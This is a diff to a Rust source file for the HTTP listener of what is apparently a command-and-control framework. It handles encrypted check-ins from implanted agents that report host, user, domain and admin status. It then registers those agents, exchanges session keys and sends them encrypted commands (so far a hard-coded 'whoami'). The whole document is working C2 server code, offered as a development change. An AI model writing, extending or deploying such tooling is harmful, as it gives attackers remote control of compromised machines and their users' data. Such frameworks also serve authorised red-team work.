@@ -1,16 +1,12 @@
 use actix_web::{App, HttpResponse, HttpServer, Responder, dev::ServerHandle, error::{ErrorBadRequest, ErrorInternalServerError}, guard, web};
-use application::domain::model::{id::{AgentId, ListenerId}, listener_model::{ListenerModel, ListenerProtocol}};
-use std::net::SocketAddr;
+use application::domain::model::{id::{AgentId, ListenerId}, listener_model::ListenerModel};
 use std::time::Duration;
 use tokio::{sync::{mpsc::{self, UnboundedSender}, oneshot}, task::JoinHandle};
 
-use crate::{c2_message::{AgentMessage, C2Message}, listener::{listener::ListenerPort, packet::{Encrypted, MessageBody, Packet, Payload, Plain}}};
+use crate::{c2_message::{AgentMessage, C2Message}, listener::{listener::Listener, packet::{Command, Commands, Encrypted, MessageBody, Packet, Payload, Plain}}};
 
 pub struct HttpListener {
-    pub id: ListenerId,
-    pub name: String,
-    pub addr: SocketAddr,
-    pub protocol: ListenerProtocol,
+    pub model: ListenerModel,
     pub handle: Option<ServerHandle>,
     pub server_task: Option<JoinHandle<anyhow::Result<()>>>,
     pub sender: mpsc::UnboundedSender<C2Message>,
@@ -25,12 +21,9 @@ impl Drop for HttpListener {
 }
 
 impl HttpListener {
-    pub fn new(id: ListenerId, name: String, addr: SocketAddr, protocol: ListenerProtocol, sender: mpsc::UnboundedSender<C2Message>) -> Self {
+    pub fn new(model: ListenerModel, sender: mpsc::UnboundedSender<C2Message>) -> Self {
         Self {
-            id,
-            name,
-            addr,
-            protocol,
+            model,
             handle: None,
             server_task: None,
             sender,
@@ -39,7 +32,10 @@ impl HttpListener {
 
     pub fn spawn(&mut self) -> anyhow::Result<()> {
         let sender = self.sender.clone();
-        let model = self.listener_model();
+
+        let model = self.model.clone();
+        let addr= (model.lhost.clone(), model.lport);
+
         let server = HttpServer::new(move || { 
             App::new()
                 .app_data(web::Data::new(sender.clone()))
@@ -54,7 +50,7 @@ impl HttpListener {
                 )
         })
             .workers(1)
-            .bind(self.addr)?
+            .bind(addr)?
             .shutdown_timeout(10)
             .disable_signals()
             .run();
@@ -74,115 +70,127 @@ impl HttpListener {
 }
 
 async fn dispatch(body: web::Bytes, sender: web::Data<UnboundedSender<C2Message>>, model: web::Data::<ListenerModel>) -> Result<impl Responder, actix_web::error::Error> {
-    let encrypted = Packet::<Encrypted>::new(body);
+    let encrypted = Packet::<Encrypted>::try_from(body.clone())
+        .map_err(|e| {
+            log::warn!("{e}");
+            ErrorBadRequest("")
+    })?;
+
+    let checkin_key = model.checkin_key;
     
-    // listener鍵で暗号化試行する。復号できればチェックインリクエストとして処理
-    // そうでなければ先頭のu32をAgentIdとしてパースし、鍵を検索してdataを復号
-    // もしくは持ってる鍵総当たり 
-    
-    let decrypted = encrypted.decrypt(key)
-        .map_err(|_| ErrorInternalServerError(""))?;
-   
-    let parsed = decrypted.deserialize()
-        .map_err(|_| ErrorBadRequest(""))?;
+    if let Ok(decrypted) = encrypted.decrypt(checkin_key) {
+        let payload = decrypted.get_payload()
+            .map_err(|e| {
+                log::warn!("{e}");
+                ErrorBadRequest("")
+            })?;
+        
+        match payload.data {
+            MessageBody::Checkin {
+                listener_id,
+                process_id,
+                thread_id,
+                arch,
+                is_admin,
+                process_name,
+                os,
+                domain_name,
+                computer_name,
+                user_name,
+                received_pubkey
+            } => {
+                // チェックインプロセス
+                let (tx, rx) = oneshot::channel();
+                let add_agent_msg = C2Message::AddAgent { 
+                    listener_id: ListenerId::from(listener_id),
+                    process_id,
+                    thread_id,
+                    arch,
+                    is_admin,
+                    process_name,
+                    os,
+                    domain_name,
+                    computer_name,
+                    user_name, 
+                    received_pubkey, 
+                    reply: tx, 
+                };
 
-    if !packet.magic == 0xf3f3 {
-        return Err(actix_web::error::ErrorBadRequest("invalid magic"));
-    };
+                let _ = sender.send(add_agent_msg); 
 
-    if !packet.length == body[10..].len() as u64 {
-        return Err(actix_web::error::ErrorBadRequest("invalid length"));
-    };
+                let (model, session_pubkey) = rx.await
+                    .map_err(|e| {
+                        log::warn!("{e}");
+                        ErrorInternalServerError("")
+                    })?
+                    .map_err(|e| {
+                        log::warn!("{e}");
+                        ErrorInternalServerError("")
+                    })?;
+                
+                let payload = Payload::new(MessageBody::CheckinAck { session_pubkey });
+                let checkin_ack_packet = Packet::<Plain>::new(model.id.to_u128(), payload.serialize());
+                let encrypted = checkin_ack_packet.encrypt(checkin_key)
+                    .map_err(|e| {
+                        log::warn!("{e}");
+                        ErrorInternalServerError("")
+                    })?;
 
-    log::info!("{:?}", &packet);
-
-    match packet.body {
-        crate::listener::packet::Body::Plain(tlvs) => { 
-            let res = handle_checkin(sender, tlvs, model).await; 
-            let bytes = serde_cbor::to_vec(&res).unwrap();
-            return Ok(HttpResponse::Ok().body(bytes))
-        },
-        crate::listener::packet::Body::Encrypted { nonce: _, cipher_text: _, tag: _ } => {
-            let agent_id = AgentId::new(uuid::Uuid::from_bytes(packet.agent_id));
-            let (tx, rx) = oneshot::channel();
-            
-            let msg = C2Message::ToAgent { 
-                agent_id,
-                msg: AgentMessage::Query { reply: tx },
-            };
-            let _ = sender.send(msg);
-
-            let agent = rx.await
-                .map_err(|e| actix_web::error::ErrorInternalServerError(e))?
-                .map_err(|e| actix_web::error::ErrorInternalServerError(e))?;
-
-            log::info!("agent {} shared secret: {:?}", agent.id, agent.shared_secret);
-
-            let plain = packet.decrypt(agent.shared_secret).unwrap(); // TODO
-            let tlv = plain.first().unwrap();
-
-            match tlv {
-                Tlv::CheckinCompleteReq(checkin_complete_request) => {
-                    log::info!("{}", checkin_complete_request.agent_info);
-                },
-                _ => (),
+                return Ok(HttpResponse::Ok().body(encrypted.serialize()));
             }
-            return Ok(HttpResponse::Ok().body("ok"))
-        },
-    }
-}
-
-async fn handle_checkin(sender: web::Data<UnboundedSender<C2Message>>, payload: Payload, model: web::Data::<ListenerModel>) -> anyhow::Result<Packet<Plain>> {
-    if payload.magic != 0xf3f3 {
-        anyhow::bail!("Invalid magic number: {}", payload.magic);
-    }
+            _ => {
+                log::warn!("expected Checkin request bad other request received.");
+                return Err(ErrorBadRequest(""));
+            }
+        }
+    };
     
-    let MessageBody::Checkin { 
-        agent_pubkey, 
-        os, 
-        hostname, 
-        username, 
-        process_name, 
-    } = payload.data else {
-        anyhow::bail!("Expected checkin request bad other request received");
+    // Beatプロセス
+    let encrypted = Packet::<Encrypted>::try_from(body)
+        .map_err(|e| {
+            log::warn!("{e}");
+            ErrorBadRequest("")
+    })?;
+
+    let agent_id = AgentId::from(encrypted.get_agent_id());
+    
+    let (reply, rx) = oneshot::channel();
+    
+    let lookup_msg = C2Message::ToAgent { 
+        agent_id: agent_id.clone(),
+        msg: AgentMessage::LookupSharedSecret { reply },
     };
 
-    let (reply, rx) = oneshot::channel();
-    let _ = sender.send(C2Message::AddAgent { listener_id: model.id.clone(), received_pubkey: agent_pubkey, reply });
-    let agent = rx.await.unwrap().unwrap(); // TODO
-    
-    let response_payload = Payload::new(
-    MessageBody::CheckinAck { session_pubkey: agent.session_pubkey, agent_id: agent.id.to_u128() }
-    );
-    let packet = Packet::<Plain>::new(response_payload.serialize());
-    return Ok(packet);
+    let _ = sender.send(lookup_msg);
 
+    let shared_secret = rx.await
+       .map_err(|e| {
+           log::warn!("{e}");
+           ErrorInternalServerError("")
+       })?
+       .map_err(|e| {
+           log::warn!("{e}");
+           ErrorInternalServerError("")
+       })?;
+    
+    let payload = Payload::new(MessageBody::Command { 
+        commands: Commands(vec![Command::Whoami]) // TODO
+    });
+
+    let response_packet = Packet::<Plain>::new(agent_id.to_u128(), payload.serialize());
+
+    let encrypted = response_packet.encrypt(shared_secret)
+        .map_err(|e| {
+           log::warn!("{e}");
+           ErrorInternalServerError("")
+        })?;
+    
+    Ok(HttpResponse::Ok().body(encrypted.serialize()))
 }
 
 
 #[async_trait::async_trait]
-impl ListenerPort for HttpListener {
-    fn id(&self) -> ListenerId {
-        self.id.clone()
-    }
-    fn name(&self) -> String {
-        self.name.to_string()
-    }
-    fn addr(&self) -> SocketAddr {
-        self.addr
-    }
-    fn protocol(&self) -> ListenerProtocol {
-        self.protocol.clone()
-    }
-    fn listener_model(&self) -> ListenerModel {
-        ListenerModel {
-            id: self.id(),
-            name: self.name(),
-            addr: self.addr(),
-            protocol: self.protocol(),
-        }
-    }
-
+impl Listener for HttpListener {
     fn start(&mut self) -> anyhow::Result<()> {
         self.spawn()
     }
